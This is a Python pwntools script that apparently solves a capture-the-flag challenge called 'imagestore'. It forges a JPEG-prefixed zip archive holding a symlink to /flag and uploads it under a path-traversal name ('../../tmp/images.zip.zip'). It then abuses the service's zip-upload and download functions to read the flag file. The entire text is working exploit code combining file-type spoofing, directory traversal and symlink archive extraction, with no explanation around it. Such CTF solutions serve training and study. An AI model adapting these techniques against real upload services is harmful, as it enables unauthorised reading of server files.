import os
import subprocess
from pwn import *

JPEG_MAGIC_BYTES = b'\xff\xd8\xff\xdb'

HOST = os.environ.get("HOST", "imagestore.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15000))

conn = remote(HOST, PORT)

conn.recvuntil(b'> ')
conn.send(b'1\n')  # upload an image

initial_path = os.getcwd()
os.chdir('/tmp')

try:
    os.remove('file.zip')
    os.remove('flag')
except:
    pass

subprocess.run(['ln', '-s', '/flag', 'flag'])
subprocess.run(['zip', '--symlinks', 'file.zip', 'flag'])

with open('file.zip', 'rb') as zipfile:
    content = zipfile.read()

os.remove('file.zip')
os.remove('flag')

os.chdir(initial_path)

payload = b64e(JPEG_MAGIC_BYTES + content).encode()

conn.recvuntil(b': ')  # image name
conn.send(b'../../tmp/images.zip.zip\n')

conn.recvuntil(b': ')  # image payload
conn.send(payload + b'\n')

conn.recvuntil(b'> ')
conn.send(b'4\n')  # upload multiple images

conn.recvuntil(b': ')  # zip payload
conn.send(b'/\n')  # invalid base64

conn.recvuntil(b'> ')
conn.send(b'2\n')  # download an image

conn.recvuntil(b'> ')
conn.send(b'0\n')  # flag
conn.recvuntil(b'\n')

flag = b64d(conn.recvuntil(b'\n')).decode()

conn.close()

# Print the flag to stdout
print(flag)
